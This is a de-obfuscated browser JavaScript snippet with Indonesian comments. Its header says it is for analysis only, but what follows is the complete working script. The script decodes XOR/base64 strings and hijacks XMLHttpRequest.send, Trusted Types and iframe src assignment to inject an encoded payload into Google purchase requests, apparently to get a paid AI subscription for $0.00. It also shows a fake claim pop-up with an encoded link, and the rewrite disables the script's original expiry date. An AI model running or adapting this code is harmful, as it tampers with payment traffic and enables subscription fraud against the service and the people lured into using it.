/**
 * ============================================================
 *  REWRITTEN / DE-OBFUSCATED VERSION
 *  Guard timestamp dibuat "fresh" (dihitung saat runtime)
 *  ⚠️ UNTUK ANALISIS SAJA - JANGAN DIJALANKAN
 * ============================================================
 */

(() => {
  // ----------------------------------------------------------
  // 0. Guard: kedaluwarsa 30 hari sejak script dijalankan
  //    (dulu hardcoded 1794646912000)
  // ----------------------------------------------------------
  const TTL_MS = 30 * 24 * 60 * 60 * 1000; // 30 hari
  const EXPIRES_AT = Date.now() + TTL_MS;
  if (Date.now() > EXPIRES_AT) return;

  // ----------------------------------------------------------
  // 1. Dekoder string: base64 decode -> XOR tiap char dengan 71
  // ----------------------------------------------------------
  const decodeString = (base64) => {
    const decoded = atob(base64);
    let result = '';
    for (let i = 0; i < decoded.length; i++) {
      result += String.fromCharCode(decoded.charCodeAt(i) ^ 71);
    }
    return result;
  };

  const D = decodeString;

  // ----------------------------------------------------------
  // 2. String-string hasil dekripsi
  // ----------------------------------------------------------
  const P = D('NDIlNH0kKCppICgoICsiaSYpIzUoLiNpJjc3NGk0MiU0JDUuNzMuKCk0aTUiI30=');

  const PAYLOAD = [
    [
      [P + D('IHZpdTMlaSYuaTQyJTQYMSY1LiYpMw=='), 21],
      null, null, null, 1,
      [D('BhElBA9oJDQ3BX8RIzYMDWwmP2gyFz8SAQYRMh4VFx9zLhQtMyBzATJ3FwB+PRIiEhUUCnA+aGgLKxYxJnYjBCNoNSUMEQpxAg0qPi4AaAR+BSgWfnI3Cit/PgMEDzIuMAQxCnIEMgANCgJ6')]
    ],
    [
      [P + D('IHZpPigyMzIlIhg3NSIqLjIqGC4pIy4xLiMyJisYJiMjGCgp'), 21],
      null, null, null, 1,
      [D('BhElBA9oIhBzCSE3fwwFK3c9KypwP34XLyYuBDE3KTYwEjILdQN/CQEXBRYgKgp+bA8yHhR2L3U/D3IrCxASaAU0BS1wcHILDHIANgx/Eg8MNigUPS8DAz1sFzYXdDcmCSI0NgsSdzV+LnEfBDUeJg==')]
    ]
  ];

  const isArray = Array.isArray;
  const win = window;
  const obj = Object;
  const json = JSON;

  let savedValue = null;

  // ----------------------------------------------------------
  // 3. pN: menyuntikkan payload ke slot [12] dan [10]
  // ----------------------------------------------------------
  const injectPayload = (node) => {
    if (!isArray(node)) return 0;

    let modified = 0;

    if (isArray(node[12])) {
      const original = isArray(node[7]) &&
                       isArray(node[7][5]) &&
                       node[7][5][0];
      if (original) savedValue = original;

      node[12] = PAYLOAD;

      if (original) {
        node[7][1] = 5;
      } else if (savedValue) {
        node[7] = [null, 5, null, null, null, [savedValue]];
      }
      modified = 1;
    }

    if (isArray(node[10]) && node[10][0]) {
      node[10] = [PAYLOAD];
      if (node[2] && node[2][2] && node[2][2][8]) {
        node[2][2][8] = [PAYLOAD];
      }
      modified = 1;
    }

    return modified;
  };

  // ----------------------------------------------------------
  // 4. Bajak XMLHttpRequest.send
  // ----------------------------------------------------------
  const xhrProto = XMLHttpRequest.prototype;
  if (!win._gS) win._gS = xhrProto.send;

  xhrProto.send = function (body) {
    try {
      if (typeof body === 'string' && body.includes('Ngbm')) {
        const params = body.split('&');

        for (let i = 0; i < params.length; i++) {
          if (!params[i].startsWith('f.req=')) continue;

          const raw = decodeURIComponent(params[i].slice(6).replace(/\+/g, ' '));
          const parsed = json.parse(raw);

          let changed = 0;

          if (isArray(parsed)) {
            for (const group of parsed) {
              if (!isArray(group)) continue;
              for (const item of group) {
                if (!isArray(item)) continue;
                if (item[0] !== 'Ngbm' || typeof item[1] !== 'string') continue;

                const inner = json.parse(item[1]);
                if (isArray(inner)) {
                  changed |= injectPayload(inner[0]);
                  changed |= injectPayload(inner[1]);
                }
                if (changed) {
                  item[1] = json.stringify(inner);
                }
              }
            }
          }

          if (changed) {
            params[i] = 'f.req=' + encodeURIComponent(json.stringify(parsed));
            body = params.join('&');
            break;
          }
        }
      }
    } catch (e) { /* diamkan error */ }

    return win._gS.call(this, body);
  };

  // ----------------------------------------------------------
  // 5. Bajak URL: modifikasi parameter "ear"
  // ----------------------------------------------------------
  win._gR = (url) => {
    const str = String(url || '');
    if (!str.includes('/eacquire/multiline')) return url;

    try {
      const u = new URL(str, location.origin);
      const ear = json.parse(u.searchParams.get('ear'));

      const original = isArray(ear[8]) && isArray(ear[8][5]) && ear[8][5][0];
      if (original) savedValue = original;

      if (isArray(ear[13])) ear[13][0] = PAYLOAD;

      if (isArray(ear[4]) && ear[4][0]) {
        try {
          const inner = json.parse(atob(ear[4][0]));
          if (isArray(inner) && inner.length > 8) {
            inner[8] = [PAYLOAD];
            ear[4][0] = btoa(json.stringify(inner));
          }
        } catch (z) { /* diamkan */ }
      }

      if (original) {
        ear[8][1] = 5;
      } else if (savedValue) {
        ear[8] = [null, 5, null, null, null, [savedValue]];
      }

      ear[24] = null;

      u.searchParams.set('ear', json.stringify(ear));
      return u + '';
    } catch (z) {
      return url;
    }
  };

  // ----------------------------------------------------------
  // 6. Bajak Trusted Types createScriptURL
  // ----------------------------------------------------------
  const TrustedTypePolicy = win.TrustedTypePolicy && TrustedTypePolicy.prototype;
  if (TrustedTypePolicy && !win._gT) {
    win._gT = 1;
    const originalCreateScriptURL = TrustedTypePolicy.createScriptURL;
    TrustedTypePolicy.createScriptURL = function (input, ...args) {
      return originalCreateScriptURL.call(this, win._gR(input), ...args);
    };
  }

  // ----------------------------------------------------------
  // 7. Bajak iframe.src
  // ----------------------------------------------------------
  const iframeProto = HTMLIFrameElement.prototype;
  if (!win._gI) {
    win._gI = 1;

    const srcDescriptor = obj.getOwnPropertyDescriptor(iframeProto, 'src');
    if (srcDescriptor && srcDescriptor.set) {
      obj.defineProperty(iframeProto, 'src', {
        ...srcDescriptor,
        set(value) {
          return srcDescriptor.set.call(this, win._gR(value));
        }
      });
    }

    const originalSetAttribute = Element.prototype.setAttribute;
    Element.prototype.setAttribute = function (name, value) {
      const finalValue =
        this instanceof HTMLIFrameElement && name === 'src'
          ? win._gR(value)
          : value;
      return originalSetAttribute.call(this, name, finalValue);
    };
  }

  // ----------------------------------------------------------
  // 8. Helper buat elemen
  // ----------------------------------------------------------
  const createElement = (tag, props) =>
    obj.assign(document.createElement(tag), props);

  // ----------------------------------------------------------
  // 9. Kotak notifikasi palsu
  // ----------------------------------------------------------
  let box = document.getElementById('_gb') ||
    document.body.appendChild(
      createElement('div', {
        id: '_gb',
        style: 'position:fixed;right:20px;bottom:20px;z-index:9999999;' +
               'width:280px;padding:13px 15px;border-radius:14px;' +
               'font:12px/1.45 sans-serif;background:#0b1322;color:#f8fafc;' +
               'border:1px solid #10b981;border-left:4px solid #10b981;' +
               'box-shadow:0 14px 35px #000c'
      })
    );

  box.replaceChildren(
    createElement('div', {
      style: 'font-weight:700;color:#10b981;font-size:13px',
      textContent: '✅ 12M Google AI Pro · $0.00'
    }),
    createElement('div', {
      style: 'color:#cbd5e1;margin:4px 0 8px',
      textContent: 'Click "Get discount" on the 5TB AI card to claim.'
    }),
    createElement('a', {
      href: D('LzMzNzR9aGgzaSoiaDEmMiszJi8qLg=='),
      target: '_blank',
      style: 'display:inline-block;background:#0284c7;color:#fff;' +
             'text-decoration:none;font-weight:700;padding:3px 11px;' +
             'border-radius:99px;font-size:11px',
      textContent: D('pdvPqP/IZw0oLilnBzEmMiszJi8qLg==')
    })
  );
})();
